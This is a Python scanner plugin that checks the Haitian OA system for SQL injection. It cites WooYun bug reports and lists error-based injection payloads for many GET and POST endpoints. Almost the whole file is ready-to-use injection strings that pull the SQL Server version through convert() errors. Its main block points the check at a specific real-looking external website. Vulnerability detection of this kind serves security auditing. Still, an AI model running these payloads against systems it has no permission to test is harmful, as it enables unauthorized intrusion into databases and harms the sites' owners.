#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 海天OA多处SQL注入
author: yichin
refer: 
    http://www.wooyun.org/bugs/wooyun-2010-083161
    http://www.wooyun.org/bugs/wooyun-2010-082495
    http://www.wooyun.org/bugs/wooyun-2010-084195
    http://www.wooyun.org/bugs/wooyun-2010-082673
    http://www.wooyun.org/bugs/wooyun-2015-0118048
    http://www.wooyun.org/bugs/wooyun-2015-0122661
    
description:
    
'''

def assign(service, arg):
    if service == 'haitianoa':
        return True, arg

def audit(arg):
    #GET型
    urls  = [
        arg + 'ZhuanTi/OA_Loadlink.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'ZhuanTi/OA_WordDocDisplay.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'kaoQin/JiaoYanDis.asp?StartDate=1%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
        arg + 'Documents/OA_DocDisplay_NewWindow.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'UserInfor/UserInfor.asp?UserName=sa%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
        arg + 'UserInfor/BuMenDetail.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'message/mytreedata.asp?bumenid=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
        arg + 'message/BuMenDetail.asp?UserName=chen%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)%20and%20%27abc%27=%27abc',
        arg + 'mailClassInfor.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'ZhuanTi/TongJi.asp?source=2&OAID=0%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
        arg + 'ZhuanTi/DocMain.asp?type=-1%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
        arg + 'Documents/OA_WordDocDisplay.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'ZhuanTi/frmmain.asp?type=-1%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
    ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url)
        if (code == 200) and ('WtFaBcMicrosoft SQL Server' in res):
            security_hole("SQL Injection: " + url)
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    #POST 型
    urls = [
        arg + 'portal/content/content_1.asp',
        arg + 'VO_EmailCaoGao.asp?action=search'
    ]
    datas = [
        'block_id=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        'start=1&currentPg=1&lastPg=0&prevPg=0&nextPg=2&totalRecord=0&sortColumn=12345&sortDirection=12345&foundRec=12345&btnAction=12345&searchcondation=%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&txtGoto=123&MaxRowPerPage=10&dellist=123'
    ]
    for i in range(len(urls)):
        url = urls[i]
        data = datas[i]
        code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
        if(code == 200 and 'WtFaBcMicrosoft SQL Server' in res):
            security_hole('SQL Injection: ' + url + ' POST:' +data)
if __name__ == '__main__':
    from dummy import *
    audit(assign('haitianoa', 'http://www.fzsyxx.com/oa/')[1])
